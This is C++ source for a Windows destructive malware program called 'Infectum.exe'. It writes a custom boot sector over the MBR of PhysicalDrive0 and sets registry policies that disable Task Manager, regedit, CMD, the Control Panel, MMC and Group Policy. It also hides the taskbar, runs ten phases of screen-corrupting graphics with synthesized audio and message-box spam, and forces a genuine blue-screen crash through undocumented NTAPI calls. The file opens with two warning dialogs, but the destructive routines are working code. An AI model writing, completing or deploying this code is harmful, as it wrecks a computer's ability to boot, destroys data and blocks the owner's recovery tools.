#include <windows.h>
#include <mmsystem.h>
#include <cmath>
#include <ctime>
#include <string>
#include <cstdlib>

#pragma comment(lib, "winmm.lib")

#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif

// Прототипы скрытых функций NTAPI для вызова честного BSoD
typedef NTSTATUS(NTAPI* pfnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI* pfnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

// Глобальные переменные экрана и контроля текущей фазы
int w, h;
int currentPhase = 0; // Переключатель активной фазы (от 1 до 10)
bool drawerActive = false; 

// ИСПРАВЛЕНО: Явное выделение фиксированной памяти под строку ОС для Registry API
char currentOS[128] = "Infectum OS"; 

// Буферы для хранения полноценных звуковых дорожек из памяти (10 Фаз)
char* audioBuffer1 = NULL;
char* audioBuffer2 = NULL;
char* audioBuffer3 = NULL;
char* audioBuffer4 = NULL;
char* audioBuffer5 = NULL;
char* audioBuffer6 = NULL; 
char* audioBuffer7 = NULL; 
char* audioBuffer8 = NULL; 
char* audioBuffer9 = NULL; 
char* audioBuffer10 = NULL;

// --- ИСПРАВЛЕНО: АВТООПРЕДЕЛЕНИЕ ТЕКУЩЕЙ СИСТЕМЫ С КОРРЕКТНЫМ РАЗМЕРОМ БУФЕРА ---
void DetectCurrentOS() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD bufSize = sizeof(currentOS); // Теперь вернет честные 128 байт
        if (RegQueryValueExA(hKey, "ProductName", NULL, NULL, (BYTE*)currentOS, &bufSize) != ERROR_SUCCESS) {
            lstrcpyA(currentOS, "Unknown OS");
        }
        RegCloseKey(hKey);
    } else {
        lstrcpyA(currentOS, "Unknown Environment");
    }
}

// --- БОЕВЫЕ ОКНА-ПРЕДУПРЕЖДЕНИЯ НА СТАРТЕ ---
bool ShowWarnings() {
    if (MessageBoxA(NULL, "Run malware?", "Warning", MB_YESNO | MB_ICONWARNING | MB_TOPMOST) == IDNO) return false;
    if (MessageBoxA(NULL, "Are you sure? This is a delete your operating system and data!", "LAST WARNING", MB_YESNO | MB_ICONERROR | MB_TOPMOST) == IDNO) return false;
    return true;
}
// --- КАРТИНА "ИНФЕКЦИЯ" В MBR ДИСКА PhysicalDrive0 ---
void DestructMBR() {
    BYTE mbrData[] = {
        0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFA, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xDB,
        0x31, 0xDF, 0x89, 0xF8, 0x31, 0xD8, 0x0F, 0xAF, 0xC7, 0x25, 0x0F, 0x04, 0x26,
        0x88, 0x05, 0x47, 0x81, 0xFF, 0x40, 0xFA, 0x72, 0xEB, 0x43, 0xEB, 0xEA
    };
    BYTE finalBuffer[512] = {0};
    memcpy(finalBuffer, mbrData, sizeof(mbrData));
    finalBuffer[510] = 0x55; finalBuffer[511] = 0xAA;

    HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hDisk, finalBuffer, 512, &bytesWritten, NULL);
        CloseHandle(hDisk);
    }
}

// --- СУПЕР-БЛОКИРОВКА СИСТЕМЫ (ДИСПЕТЧЕР, РЕЕСТР, CMD) ---
void BlockSystemTools() {
    const char* subkeys[] = {
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"
    };
    const char* mmcKey = "Software\\Policies\\Microsoft\\MMC";
    const char* gpeditRestrictKey = "Software\\Policies\\Microsoft\\Windows\\Group Policy\\Restrictions";

    HKEY hKey;
    HKEY roots[] = { HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE };

    for (HKEY root : roots) {
        for (const char* subkey : subkeys) {
            if (RegCreateKeyExA(root, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                DWORD disable = 1;
                RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
                RegSetValueExA(hKey, "DisableRegistryTools", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
                RegSetValueExA(hKey, "DisableCMD", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
                RegSetValueExA(hKey, "NoControlPanel", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
                RegCloseKey(hKey);
            }
        }
        if (RegCreateKeyExA(root, mmcKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            DWORD restrictMMC = 1;
            RegSetValueExA(hKey, "RestrictToPermittedSnapshots", 0, REG_DWORD, (BYTE*)&restrictMMC, sizeof(restrictMMC));
            RegCloseKey(hKey);
        }
        if (RegCreateKeyExA(root, gpeditRestrictKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            DWORD noGpedit = 1;
            RegSetValueExA(hKey, "NoGroupPolicy", 0, REG_DWORD, (BYTE*)&noGpedit, sizeof(noGpedit));
            RegCloseKey(hKey);
        }
    }
}

void CorruptTaskbarOnly() {
    HWND hwndTaskbar = FindWindowA("Shell_TrayWnd", NULL);
    if (hwndTaskbar) {
        ShowWindow(hwndTaskbar, SW_HIDE);
        EnableWindow(hwndTaskbar, FALSE);
    }
}

void ClearScreenEffects() {
    InvalidateRect(NULL, NULL, TRUE);
    UpdateWindow(NULL);
    RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_UPDATENOW | RDW_ALLCHILDREN);
}

void CreateWavHeader(char* header, int sampleRate, int dataSize) {
    memcpy(header, "RIFF", 4);
    int fileSize = dataSize + 36;
    memcpy(header + 4, &fileSize, 4);
    memcpy(header + 8, "WAVEfmt ", 8);
    int subChunkSize = 16;
    memcpy(header + 16, &subChunkSize, 4);
    short audioFormat = 1;
    memcpy(header + 20, &audioFormat, 2);
    short numChannels = 1;
    memcpy(header + 22, &numChannels, 2);
    memcpy(header + 24, &sampleRate, 4);
    int byteRate = sampleRate;
    memcpy(header + 28, &byteRate, 4);
    short blockAlign = 1;
    memcpy(header + 32, &blockAlign, 2);
    short bitsPerSample = 8;
    memcpy(header + 34, &bitsPerSample, 2);
    memcpy(header + 36, "data", 4);
    memcpy(header + 40, &dataSize, 4);
}

void SynthesizeAllAudio() {
    int size1 = 8000 * 30;
    audioBuffer1 = new char[size1 + 44]; CreateWavHeader(audioBuffer1, 8000, size1);
    for (int t = 0; t < size1; t++) audioBuffer1[t + 44] = (char)(((t >> 5) | (t >> 3) | t << 3) + ((t >> 6) | (t * 2)) | (t >> 2) | (t * 2));

    int size2 = 8000 * 30;
    audioBuffer2 = new char[size2 + 44]; CreateWavHeader(audioBuffer2, 8000, size2);
    for (int t = 0; t < size2; t++) audioBuffer2[t + 44] = (char)((t >> 6 | t | t >> (t >> 16)) * 10 + ((t >> 12 & 3) * (t >> 4 & 128)));

    int size3 = 8000 * 30;
    audioBuffer3 = new char[size3 + 44]; CreateWavHeader(audioBuffer3, 8000, size3);
    for (int t = 0; t < size3; t++) audioBuffer3[t + 44] = (char)(t * ((t >> 3 | t % 9 * t >> 5) & 2 * t >> 9));

    int size4 = 11025 * 30;
    audioBuffer4 = new char[size4 + 44]; CreateWavHeader(audioBuffer4, 11025, size4);
    for (int t = 0; t < size4; t++) audioBuffer4[t + 44] = (char)(9 * (t * ((t >> 9 | t >> 13) & 15) & 16));

    int size5 = 8000 * 30;
    audioBuffer5 = new char[size5 + 44]; CreateWavHeader(audioBuffer5, 8000, size5);
    for (int t = 0; t < size5; t++) audioBuffer5[t + 44] = (char)(t * ((t >> 2 | t % 1 * t >> 8) & 2 * t >> 9));

    int size6 = 32000 * 50;
    audioBuffer6 = new char[size6 + 44]; CreateWavHeader(audioBuffer6, 32000, size6);
    for (int t = 0; t < size6; t++) audioBuffer6[t + 44] = (char)((t >> 7 | t | t >> 6) * 10 + 4 * (t & t >> 13 | t >> 6));

    int size7 = 8000 * 45;
    audioBuffer7 = new char[size7 + 44]; CreateWavHeader(audioBuffer7, 8000, size7);
    for (int t = 0; t < size7; t++) audioBuffer7[t + 44] = (char)(((t >> 10) | (t >> 4)) * t & ((t >> 8) | (t >> 10)));

    int size8 = 11025 * 45;
    audioBuffer8 = new char[size8 + 44]; CreateWavHeader(audioBuffer8, 11025, size8);
    for (int t = 0; t < size8; t++) audioBuffer8[t + 44] = (char)(((t >> 8) + t & t) - (t >> 15) * t & 64);

    int size9 = 22050 * 45;
    audioBuffer9 = new char[size9 + 44]; CreateWavHeader(audioBuffer9, 22050, size9);
    for (int t = 0; t < size9; t++) audioBuffer9[t + 44] = (char)(((t >> 3 & 1) * t >> 3) ^ (char)(t >> 7) * (char)t);

    int size10 = 8000 * 50;
    audioBuffer10 = new char[size10 + 44]; CreateWavHeader(audioBuffer10, 8000, size10);
    for (int t = 0; t < size10; t++) {
        audioBuffer10[t + 44] = static_cast<char>(t * ((t & 4096 ? (t % 65536 < 59392 ? 7 : t >> 6) : 16) + (1 & t >> 14)) >> (3 & -t >> (t & 2048 ? 2 : 10)));
    }
}
DWORD WINAPI payload_message_phase1(LPVOID lpParam) {
    while (drawerActive && currentPhase == 1) {
        MessageBoxW(NULL, NULL, L"Infectum.exe", 2);
        Sleep(500);
    }
    return 0;
}

DWORD WINAPI VisualPhase1(LPVOID lpParam) {
    HWND hwndDesktop = GetDesktopWindow(); HDC hdc = GetWindowDC(hwndDesktop);
    double shiftTime = 0.0;
    while (drawerActive && currentPhase == 1) {
        for (int y = 0; y < h; y++) {
            int lineShift = static_cast<int>(sin(shiftTime) * 50.0);
            BitBlt(hdc, 0, y, w, 1, hdc, lineShift, y, SRCCOPY);
            shiftTime += 0.0001;
        }
        Sleep(10);
    }
    ReleaseDC(hwndDesktop, hdc); return 0;
}

DWORD WINAPI VisualPhase2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); HICON winIcons[] = { LoadIcon(NULL, IDI_APPLICATION), LoadIcon(NULL, IDI_QUESTION), LoadIcon(NULL, IDI_EXCLAMATION), LoadIcon(NULL, IDI_ASTERISK), LoadIcon(NULL, IDI_ERROR) };
    int rectX = w / 2, rectY = h / 2, rectW = 120, rectH = 35, rSpeedX = 12, rSpeedY = 12;
    int osX = 100, osY = 100, osSpeedX = 8, osSpeedY = 6; int t = 0;

    while (drawerActive && currentPhase == 2) {
        HPEN hPenCurve = CreatePen(PS_SOLID, 4, RGB(rand()%256, rand()%256, rand()%256));
        HBRUSH hOldBrushTr = (HBRUSH)SelectObject(hdc, hPenCurve); Arc(hdc, rand()%w, rand()%h, rand()%w, rand()%h, rand()%w, rand()%h, rand()%w, rand()%h);
        SelectObject(hdc, hOldBrushTr); DeleteObject(hPenCurve);

        SetTextColor(hdc, RGB(rand()%256, rand()%256, rand()%256)); SetBkMode(hdc, TRANSPARENT);
        HFONT hFontOS = CreateFontA(48, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial");
        HFONT hOldFontOS = (HFONT)SelectObject(hdc, hFontOS);
        if (t % 40 == 0) { osX = rand() % (w - 300); osY = rand() % (h - 100); }
        TextOutA(hdc, osX, osY, currentOS, strlen(currentOS)); SelectObject(hdc, hOldFontOS); DeleteObject(hFontOS);

        if (t % 15 == 0) {
            HBRUSH hFlash = CreateSolidBrush(RGB(rand()%256, rand()%256, rand()%256)); BitBlt(hdc, rand()%w, rand()%h, rand()%(w/3), rand()%(h/3), hdc, 0, 0, PATINVERT); DeleteObject(hFlash);
        }
        int ix = rand() % w, iy = rand() % h; BitBlt(hdc, ix, iy, rand() % 500, rand() % 500, hdc, ix, iy, DSTINVERT);

        HBRUSH hNullBrush = (HBRUSH)GetStockObject(NULL_BRUSH); HBRUSH hOldBrush = (HBRUSH)SelectObject(hdc, hNullBrush);
        int rX = (int)(cos(t * 0.05) * 150 + 200); int rY = (int)(sin(t * 0.05) * 150 + 200);

        for (int i = 0; i < 300; i += 20) {
            HPEN hRainbowPen = CreatePen(PS_SOLID, 2, RGB((i + t * 4) % 256, (i * 2 + t * 2) % 256, (i * 3) % 256));
            HPEN hOldRainbow = (HPEN)SelectObject(hdc, hRainbowPen); Ellipse(hdc, w / 2 - rX + i, h / 2 - rY, w / 2 + rX - i, h / 2 + rY);
            SelectObject(hdc, hOldRainbow); DeleteObject(hRainbowPen);
        }
        SelectObject(hdc, hOldBrush); DrawIcon(hdc, rand() % w, rand() % h, winIcons[rand() % 5]);

        rectX += rSpeedX; rectY += rSpeedY; if (rectX < 0 || rectX + rectW > w) rSpeedX = -rSpeedX; if (rectY < 0 || rectY + rectH > h) rSpeedY = -rSpeedY;
        HBRUSH hBoxBrush = CreateSolidBrush(RGB(rand()%256, rand()%256, rand()%256)); RECT boxRect = { rectX, rectY, rectX + rectW, rectY + rectH };
        FillRect(hdc, &boxRect, hBoxBrush); DeleteObject(hBoxBrush);

        SetTextColor(hdc, RGB(255, 255, 255)); HFONT hFontBox = CreateFontA(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial");
        HGDIOBJ hOldFontBox = SelectObject(hdc, hFontBox); DrawTextA(hdc, "Infectum.exe", -1, &boxRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        SelectObject(hdc, hOldFontBox); DeleteObject(hFontBox);
        t++; Sleep(35);
    }
    ReleaseDC(NULL, hdc); return 0;
}

DWORD WINAPI VisualPhase3(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); HICON winIcons[] = { LoadIcon(NULL, IDI_APPLICATION), LoadIcon(NULL, IDI_QUESTION), LoadIcon(NULL, IDI_EXCLAMATION), LoadIcon(NULL, IDI_ASTERISK), LoadIcon(NULL, IDI_ERROR) };
    const char* phrases[] = { "Your PC will die!!!", "Nothing can save you now!", "What the hell is going on!?", "Buy a new computer! Yours is done for..." };
    int t = 0; DWORD lastIconGroupSpawn = GetTickCount(); POINT iconPos = { w / 2, h / 2 };

    while (drawerActive && currentPhase == 3) {
        for (int i = 0; i < h; i += 12) { int waveShift = (int)(sin(i * 0.015 + t) * 8); BitBlt(hdc, waveShift, i, w, 12, hdc, 0, i, SRCCOPY); }
        HPEN hPenCurve = CreatePen(PS_SOLID, 3, RGB(rand()%256, rand()%256, rand()%256)); HPEN hOldPenCurve = (HPEN)SelectObject(hdc, hPenCurve);
        Arc(hdc, -100, -100, rand()%w, rand()%h, 0, 0, rand()%w, rand()%h); SelectObject(hdc, hOldPenCurve); DeleteObject(hPenCurve);

        POINT mousePos; GetCursorPos(&mousePos); iconPos.x += (mousePos.x - iconPos.x) / 4; iconPos.y += (mousePos.y - iconPos.y) / 4;
        if (GetTickCount() - lastIconGroupSpawn >= 500) {
            for (int angle = 0; angle < 360; angle += 45) { int radX = iconPos.x + (int)(cos(angle) * 60); int radY = iconPos.y + (int)(sin(angle) * 60); DrawIcon(hdc, radX, radY, winIcons[rand() % 5]); }
            lastIconGroupSpawn = GetTickCount();
        }
        DrawIcon(hdc, iconPos.x, iconPos.y, winIcons[rand() % 5]);

        if (t % 10 == 0) {
            SetTextColor(hdc, RGB(rand()%256, rand()%256, rand()%256)); SetBkMode(hdc, TRANSPARENT);
            HFONT hTextFont = CreateFontA(36, 0, 0, 0, FW_EXTRABOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Impact");
            HFONT hOldTextFont = (HFONT)SelectObject(hdc, hTextFont); const char* chosenPhrase = phrases[rand() % 4];
            TextOutA(hdc, rand() % (w - 400), rand() % (h - 80), chosenPhrase, strlen(chosenPhrase)); SelectObject(hdc, hOldTextFont); DeleteObject(hTextFont);
        }
        if (t % 5 == 0) { BitBlt(hdc, rand()%w, rand()%h, rand()%(w/2), rand()%(h/2), hdc, 0, 0, DSTINVERT); }
        int blockX = (rand() % (w / 100)) * 100; int blockY = (rand() % (h / 100)) * 100; BitBlt(hdc, blockX, blockY, 100, 100, hdc, blockX, blockY + 15, SRCCOPY);
        t++; Sleep(30);
    }
    ReleaseDC(NULL, hdc); return 0;
}
DWORD WINAPI VisualPhase4(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); HICON iconError = LoadIcon(NULL, IDI_ERROR);
    LPCSTR allCursors[] = { IDC_ARROW, IDC_IBEAM, IDC_WAIT, IDC_CROSS, IDC_UPARROW, IDC_SIZE, IDC_ICON, IDC_SIZENWSE, IDC_SIZENESW, IDC_SIZEWE, IDC_SIZENS, IDC_SIZEALL, IDC_NO, IDC_HAND, IDC_HELP };
    int t = 0; DWORD lastInversion = GetTickCount(); int rainY[40]; for (int i = 0; i < 40; i++) rainY[i] = rand() % h - h;

    while (drawerActive && currentPhase == 4) {
        for (int x = 0; x < w; x += 24) {
            int auroraY1 = (int)(h / 3 + sin(x * 0.004 + t * 0.05) * 120 + cos(x * 0.01) * 40); int auroraY2 = (int)(h / 2 + cos(x * 0.003 - t * 0.04) * 150 + sin(x * 0.008) * 30);
            HPEN hNeonPen = CreatePen(PS_SOLID, 12, RGB((t * 2) % 130, (x + t * 4) % 256, abs(x - t * 3) % 256));
            HPEN hOldNeon = (HPEN)SelectObject(hdc, hNeonPen); MoveToEx(hdc, x, auroraY1, NULL); LineTo(hdc, x, auroraY2); SelectObject(hdc, hOldNeon); DeleteObject(hNeonPen);
        }
        HPEN hCurvePen = CreatePen(PS_SOLID, 4, RGB(rand()%50, rand()%256, rand()%256)); HPEN hOldCurve = (HPEN)SelectObject(hdc, hCurvePen);
        Arc(hdc, -50, -50, rand()%w, rand()%h, 0, 0, rand()%w, rand()%h); SelectObject(hdc, hOldCurve); DeleteObject(hCurvePen);

        for (int i = 0; i < 30; i++) { int rX = (w / 30) * i; DrawIcon(hdc, rX, rainY[i], iconError); rainY[i] += 25; if (rainY[i] > h) rainY[i] = -32; }
        int fx = rand() % (w - 150), fy = rand() % (h - 150), destX = rand() % (w - 150), destY = rand() % (h - 150); BitBlt(hdc, destX, destY, 150, 150, hdc, fx, fy, SRCCOPY);
        HCURSOR hRandomCursor = LoadCursorA(NULL, allCursors[rand() % 15]); DrawIcon(hdc, rand() % w, rand() % h, (HICON)hRandomCursor);

        if (GetTickCount() - lastInversion >= 600) { BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, DSTINVERT); lastInversion = GetTickCount(); }
        t++; Sleep(40);
    }
    ReleaseDC(NULL, hdc); return 0;
}

DWORD WINAPI VisualPhase5(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); HICON hAlertIcon = LoadIcon(NULL, IDI_EXCLAMATION); int t = 0;
    while (drawerActive && currentPhase == 5) {
        int swimX = (int)(sin(t * 0.15) * 15), swimY = (int)(cos(t * 0.12) * 10);
        BitBlt(hdc, swimX, swimY, w, h, hdc, 0, 0, SRCCOPY); if (t % 2 == 0) { BitBlt(hdc, -swimX, swimY, w, h, hdc, 0, 0, SRCPAINT); }
        if (t % 8 == 0) {
            HBRUSH hFlashBrush = CreateSolidBrush(RGB(rand()%256, rand()%256, rand()%256)); HBRUSH hOldFlash = (HBRUSH)SelectObject(hdc, hFlashBrush);
            BitBlt(hdc, rand()%w, rand()%h, rand()%(w/2), rand()%(h/2), hdc, 0, 0, PATINVERT); SelectObject(hdc, hOldFlash); DeleteObject(hFlashBrush);
        }
        HBRUSH hNullBrush = (HBRUSH)GetStockObject(NULL_BRUSH); HBRUSH hOldBrush = (HBRUSH)SelectObject(hdc, hNullBrush);
        HPEN hVortexPen = CreatePen(PS_SOLID, 4, RGB(rand()%256, rand()%256, rand()%256)); HPEN hOldVortex = (HPEN)SelectObject(hdc, hVortexPen);
        int vortexRad = (int)(abs(sin(t * 0.08)) * 300 + 40); Ellipse(hdc, w / 2 - vortexRad, h / 2 - vortexRad, w / 2 + vortexRad, h / 2 + vortexRad);
        SelectObject(hdc, hOldVortex); DeleteObject(hVortexPen); SelectObject(hdc, hOldBrush);
        for (int i = 0; i < 3; i++) DrawIcon(hdc, rand() % w, rand() % h, hAlertIcon);
        int boxW = rand() % 160 + 100, boxH = rand() % 50 + 30, boxX = rand() % (w - boxW), boxY = rand() % (h - boxH); RECT boxRect = { boxX, boxY, boxX + boxW, boxY + boxH };
        HBRUSH hBoxBrush = CreateSolidBrush(RGB(rand()%256, rand()%256, rand()%256)); FillRect(hdc, &boxRect, hBoxBrush); DeleteObject(hBoxBrush);
        SetTextColor(hdc, RGB(rand()%256, rand()%256, rand()%256)); SetBkMode(hdc, TRANSPARENT);
        HFONT hDestructFont = CreateFontA(22, 0, 0, 0, FW_EXTRABOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Impact");
        HFONT hOldDestructFont = (HFONT)SelectObject(hdc, hDestructFont); DrawTextA(hdc, "Destruction", -1, &boxRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        SelectObject(hdc, hOldDestructFont); DeleteObject(hDestructFont);
        t++; Sleep(35);
    }
    ReleaseDC(NULL, hdc); return 0;
}

DWORD WINAPI VisualPhase6(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); HDC hdcMem = CreateCompatibleDC(hdc); HBITMAP hBmp = CreateCompatibleBitmap(hdc, w, h); SelectObject(hdcMem, hBmp);
    HICON iconError = LoadIcon(NULL, IDI_ERROR); int t = 0; int rainY[60]; for (int i = 0; i < 60; i++) rainY[i] = rand() % h - h;
    BITMAPINFO bmi = {0}; bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER); bmi.bmiHeader.biWidth = w; bmi.bmiHeader.biHeight = -h; bmi.bmiHeader.biPlanes = 1; bmi.bmiHeader.biBitCount = 32; bmi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* pixels = new RGBQUAD[w * h];
    while (drawerActive && currentPhase == 6) {
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetDIBits(hdcMem, hBmp, 0, h, pixels, &bmi, DIB_RGB_COLORS); int colorShift = t * 6;
        for (int i = 0; i < w * h; i += 8) {
            BYTE r = pixels[i].rgbRed; BYTE g = pixels[i].rgbGreen; BYTE b = pixels[i].rgbBlue;
            pixels[i].rgbRed = g + colorShift; pixels[i].rgbGreen = b - colorShift; pixels[i].rgbBlue = r + colorShift;
            for (int k = 1; k < 8 && (i+k) < w*h; k++) pixels[i+k] = pixels[i];
        }
        StretchDIBits(hdc, 0, 0, w, h, 0, 0, w, h, pixels, &bmi, DIB_RGB_COLORS, SRCCOPY); StretchBlt(hdc, 2, 2, w - 4, h - 4, hdc, 0, 0, w, h, SRCCOPY);
        for (int i = 0; i < 30; i++) { int rX = (w / 30) * i; DrawIcon(hdc, rX, rainY[i], iconError); rainY[i] += 30; if (rainY[i] > h) rainY[i] = -32; }
        t++; Sleep(40);
    }
    delete[] pixels; DeleteObject(hBmp); DeleteDC(hdcMem); ReleaseDC(NULL, hdc); return 0;
}
DWORD WINAPI VisualPhase7(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); HICON customIcons[] = { LoadIcon(NULL, IDI_ERROR), LoadIcon(NULL, IDI_SHIELD), LoadIcon(NULL, IDI_APPLICATION), LoadIcon(NULL, IDI_EXCLAMATION) }; int t = 0;
    while (drawerActive && currentPhase == 7) {
        int shakeOffset = rand() % 8 - 4;
        for (int i = 0; i < h; i += 16) { int waterShift = (int)(sin(i * 0.02 + t * 0.2) * 15) + shakeOffset; BitBlt(hdc, waterShift, i, w, 16, hdc, 0, i, SRCCOPY); }
        if (t % 2 == 0) { BitBlt(hdc, w / 2, 0, w / 2, h, hdc, 0, 0, SRCPAINT); }
        if (t % 4 == 0) { StretchBlt(hdc, w, 0, -w, h, hdc, 0, 0, w, h, SRCCOPY); BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, DSTINVERT); }
        HPEN hXorPen = CreatePen(PS_SOLID, 4, RGB(rand()%256, rand()%256, rand()%256)); HPEN hOldXor = (HPEN)SelectObject(hdc, hXorPen);
        int oldROP = SetROP2(hdc, R2_NOTXORPEN); MoveToEx(hdc, rand()%w, rand()%h, NULL); LineTo(hdc, rand()%w, rand()%h);
        SetROP2(hdc, oldROP); SelectObject(hdc, hOldXor); DeleteObject(hXorPen); DrawIcon(hdc, rand() % w, rand() % h, customIcons[rand() % 4]);
        t++; Sleep(35);
    }
    ReleaseDC(NULL, hdc); return 0;
}

DWORD WINAPI VisualPhase8(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); HICON customIcons[] = { LoadIcon(NULL, IDI_ERROR), LoadIcon(NULL, IDI_WARNING), LoadIcon(NULL, IDI_INFORMATION) }; int t = 0;
    while (drawerActive && currentPhase == 8) {
        int waveX = static_cast<int>(sin(t * 0.1) * 30.0); StretchBlt(hdc, waveX, 0, w - waveX, h, hdc, 0, 0, w, h, SRCCOPY);
        POINT poly[3]; for (int i = 0; i < 3; i++) { poly[i].x = rand() % w; poly[i].y = rand() % h; }
        HBRUSH hBrush = CreateSolidBrush(RGB(rand()%256, rand()%256, rand()%256)); HBRUSH hOld = (HBRUSH)SelectObject(hdc, hBrush); Polygon(hdc, poly, 3);
        SelectObject(hdc, hOld); DeleteObject(hBrush); DrawIcon(hdc, rand() % w, rand() % h, customIcons[rand() % 3]);
        t++; Sleep(30);
    }
    ReleaseDC(NULL, hdc); return 0;
}

DWORD WINAPI VisualPhase9(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); HDC hdcMem = CreateCompatibleDC(hdc); HBITMAP hBmp = CreateCompatibleBitmap(hdc, w, h); SelectObject(hdcMem, hBmp);
    BITMAPINFO bmi = {0}; bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER); bmi.bmiHeader.biWidth = w; bmi.bmiHeader.biHeight = -h; bmi.bmiHeader.biPlanes = 1; bmi.bmiHeader.biBitCount = 32; bmi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* pixels = new RGBQUAD[w * h]; int t = 0;
    while (drawerActive && currentPhase == 9) {
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetDIBits(hdcMem, hBmp, 0, h, pixels, &bmi, DIB_RGB_COLORS);
        for (int i = 0; i < w * h; i += 4) {
            double dVar = (double)(i % w) * 0.0625;
            int offset = static_cast<int>((dVar * static_cast<double>(t) + static_cast<double>(t)) / 300.0 + (double)(i / h) * 0.1);
            if (i + offset < w * h && i + offset >= 0) { pixels[i] = pixels[i + offset]; }
        }
        StretchDIBits(hdc, 0, 0, w, h, 0, 0, w, h, pixels, &bmi, DIB_RGB_COLORS, SRCCOPY); t += 4; Sleep(40);
    }
    delete[] pixels; DeleteObject(hBmp); DeleteDC(hdcMem); ReleaseDC(NULL, hdc); return 0;
}
DWORD WINAPI VisualPhase10(LPVOID lpParam) {
    while (drawerActive && currentPhase == 10) {
        HDC hdc = GetDC(0);
        BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
        
        HBRUSH brush1 = CreateSolidBrush(RGB(255, 255, 255)); SelectObject(hdc, brush1);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, MERGECOPY); DeleteObject(brush1);
        
        HBRUSH brush2 = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)); SelectObject(hdc, brush2);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT); DeleteObject(brush2);
        
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}

// --- ИСПРАВЛЕНО: ГАРАНТИРОВАННЫЙ ВЫЗОВ НАСТОЯЩЕГО BSoD (С ТРИГГЕРОМ PRIVILEGES) ---
void TriggerTrueBSoD() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        pfnRtlAdjustPrivilege RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        pfnNtRaiseHardError NtRaiseHardError = (pfnNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
        
        if (RtlAdjustPrivilege && NtRaiseHardError) {
            BOOLEAN bEnabled;
            // Активируем права 19 (SeShutdownPrivilege) в ядре, иначе NTAPI выдаст ошибку отказа доступа!
            RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
            
            ULONG response;
            // Теперь синий экран смерти с кодом 0x00000100 гарантированно упадет!
            NtRaiseHardError(0x00000100, 0, 0, NULL, 6, &response);
        }
    }
    ExitProcess(1);
}

